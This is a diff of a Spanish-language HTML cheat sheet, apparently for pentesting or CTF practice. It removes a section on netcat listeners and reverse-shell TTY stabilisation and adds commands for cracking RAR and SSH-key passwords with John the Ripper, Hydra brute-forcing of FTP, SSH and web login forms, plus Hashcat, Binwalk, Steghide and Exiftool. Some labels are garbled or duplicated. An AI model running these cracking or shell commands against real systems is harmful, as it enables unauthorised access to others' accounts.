-                shell es mucho mas complejo y es tecnicamente particular cuando se trata de una Shell de Windows, que
-                son notoriamente dificiles de estabilizar.
+            <li><span class="comando1">Cracking Password RAR Archives </span>
                 <ol>
-                    <li><span class="comando5">Nota se debe seguir utilizando alguna estabilizacion manual si desea usar
-                            Ctrl +
-                            C dentro del shell </span> </li>
+                    <li><span class="comando3">convertinermos el archivo rar a uno que John the Riper lo pueda
+                            reconocer</span></li>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >rar2john &lbrack;zip file&rbrack;  > &lbrack;output file&rbrack;</code></pre>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >john --wordlist=/usr/share/wordlists/rockyou.txt &lbrack;file&rbrack;</code></pre>
                 </ol>
-
-
+            </li>
+            <br>
+            <li><span class="comando1">Cracking SSH Keys </span>
                 <ol>
-                    <li><span class="comando3">1. Instalar la Shell rlwrap</span>
-            
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >sudo apt install rlwrap </code></pre>
-                    </li>
-                    <li><span class="comando2">2. Invocamos un oyente</span>
-            
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >rlwrap nc -lvp </code></pre>
-                    </li>
-                    <li><span class="comando2">3. Ejecutar el shell en segundo plano usando el comando </span>
-            
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >Ctrl + z </code></pre>
-                    </li>
-                    <li><span class="comando2">4. Ejecutar para que se apague el echo de nuesta terminal (solo cuando el
-                            objetivo sea Linux)</span>
-                
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >stty raw -echo; fg </code></pre>
-                    </li>
+                    <li><span class="comando3"> convertiremos el archivo id_rsa a uno que John the Riper lo pueda
+                            reconocer</span></li>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                            >python /usr/share/john/ssh2john.py. &lbrack;id_rsa private key&rbrack; > id_rsa_hash.txt </code></pre>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >john --wordlist=/usr/share/wordlists/rockyou.txt &lbrack;id_rsa_hash.txt&rbrack;</code></pre>
                 </ol>
             </li>
 
             <br>
             <br>
-            <div class="pasos">Tratamiento de TTY</div>
+            <span class="pasos">Hydra</span>
             <br>
-            <img class="center" src="/images/python.png" />
-            <div class="titulo">Python</div>
+            <li><span class="comando1">Cracking FTP </span>
+                <ol>
+                    <li><span class="comando3"> usar hydra para realizar fuerza bruta en el descubrimiento de
+                            credenciales de FTP</span></li>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                            >hydra -l &lbrack;USER&rbrack; -P &lbrack;WORDLIST&rbrack; ftp://&lbrack;TARGET&rbrack;</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando1">Cracking SSH </span>
+                <ol>
+                    <li><span class="comando3"> usar hydra para realizar fuerza bruta en el descubrimiento de
+                            credenciales de SSH</span></li>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >hydra -l &lbrack;USER&rbrack; -P &lbrack;WORDLIST&rbrack; &lbrack;TARGET&rbrack; -t 4 ssh</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando1">Cracking FORMS </span>
+                <ol>
+                    <li><span class="comando3"> usar hydra para realizar fuerza bruta en el descubrimiento de
+                            credenciales en formularios web</span></li>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                                >hydra -l &lbrack;USER&rbrack; -P &lbrack;WORDLIST&rbrack; &lbrack;TARGET&rbrack; http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V</code></pre>
+                    <li><span class="comando2">-l</span>: nombre del usuario </li>
+                    <li><span class="comando2">-P</span>: nombre de la lista de credenciales </li>
+                    <li><span class="comando2">http-post-form</span>: indica el tipo de formato (POST) </li>
+                    <li><span class="comando2">:username</span>: el campo del formulario donde se introduce el nombre
+                        del usuario </li>
+                    <li><span class="comando2">^USER^</span>: le dices a Hydra que "USER" el nombre de usuario </li>
+                    <li><span class="comando2">^USER^</span>: le dices a Hydra que "USER" el nombre de usuario </li>
+                    <li><span class="comando2">password</span>: el nombre del campo donde se introduce el password </li>
+                    <li><span class="comando2">^PASS^</span>: le dices a Hydra que use la lista use la lista de password
+                        suministradas </li>
+                    <li><span class="comando2">F=incorrect</span>: si esta palabra aparece en la pagina es incorrecta
+                    </li>
+                    <li><span class="comando2">-V</span>: salida de informacion para cada error </li>
+                    <li><span class="comando3">Ejemplo</span></li>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                        >hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password are incorrect." -V</code></pre>
+                </ol>
+            </li>
             <br>
-
-            <span class="comando3">1. Ejecutar para generar un Shell Bash</span>
-
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >python -c 'import pty;pty.spawn("/bin/bash")' </code></pre>
-            <span class="comando5">Nota: algunos objetivos neceistan especificar la version correcta
-                de Pyhon</span>
-            <span class="comando5">Reemplazar la version de Pyhon por: Pyhon, Python2 ó
-                Python3</span>
-
             <br>
-            <span class="comando2">2. Ejecutar para generar comando como clear</span>
-
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >export TERM=xterm </code></pre>
-
-            <span class="comando2">3. Ejecutar el shell en segundo plano usando el comando </span>
-
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >Ctrl + z </code></pre>
-
-            <span class="comando2">4. Renovar la terminal de segundo plano</span>
-
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >stty raw -echo; fg</code></pre>
-
-            <span class="comando5">Tenga en cuenta que si el Shell muere,
-                cualquier entrada en su
-                propio terminal no será visible (como resultado de haber desactivado el echo del
-                terminal).</span>
+            <span class="pasos">Hashcat</span>
             <br>
-            <span class="comando5">Solucion, escribir</span>
-
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >reset</code></pre>
-
-
-
-
-
-
+            <li><span class="comando1">Ver la informacion de metadatos de multiples archivos.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >hashcat -m &lbrack;hash-type&rbrack; -a 3 &lbrack;FILE/HASH&rbrack; &lbrack;WORDLIST PATH&rbrack;</code></pre>
+                </ol>
+            </li>
             <br>
-            <img class="center" src="/images/bash_icon.png" alt="bash icon">
-            <div class="titulo">Bash</div>
-            <span class="comando2">1. Ejecutar el siguiente comando </span>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >script /dev/null -c bash</code></pre>
-
-
-            <span class="comando2">2. Ejecutar la siguientes teclas </span>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >Ctrl +z</code></pre>
-
-            <span class="comando2">3. Ejecutar el siguiente comando </span>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >stty -echo; fg</code></pre>
-
-            <span class="comando2">4. Ejecutar el siguiente comando </span>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >reset</code></pre>
-
-
-            <span class="comando2">5. Nos pedira el tipo de terminal </span>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >Terminal type? Xterm</code></pre>
-
-            <span class="comando2">6. Configuramos la terminal </span>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >echo $TERM</code></pre>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >export TERM=xterm</code></pre>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >export SHELL=bash</code></pre>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >echo $TERM</code></pre>
-            <span class="comando2">7. Configuracion de tamaño de pantalla </span>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                >stty -a</code></pre>
-            <span class="comando4">speed 38400 baud; rows 24; columns 80; line = 0;</span></li>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                >stty rows 43 columns 171</code></pre>
-
-
-
             <br>
-
-          
-
+            <span class="pasos">Binwalk</span>
+            <br>
+            <li><span class="comando1">Analizar binarios</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >binwalk &lbrack;FILE&rbrack;</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando1">Extracion de datos del binarios</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >binwalk -e &lbrack;FILE&rbrack;</code></pre>
+                </ol>
+            </li>
+            <br>
+            <br>
+            <span class="pasos">Steghide</span>
+            <br>
+            <li><span class="comando1">Ver la informacion que contiene el archivo ya sea imagen o archivos de
+                    audio(JPEG, BMP, WAV y AU)</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >steghide info &lbrack;FILE&rbrack;</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando1">Extraer datos secretos del archivo y declara al archivo stego</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >steghide extract -sf &lbrack;FILE&rbrack;</code></pre>
+                </ol>
+            </li>
+            <br>
+            <br>
+            <span class="pasos">Exiftool</span>
+            <br>
+            <li><span class="comando1">Ver la informacion de metadatos de multiples archivos.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >exiftool -v &lbrack;FILE&rbrack;</code></pre>
+                </ol>
+            </li>
 
         </ul>
     </div>
+
 
     <script src="/javascript/prism.js"></script>
 
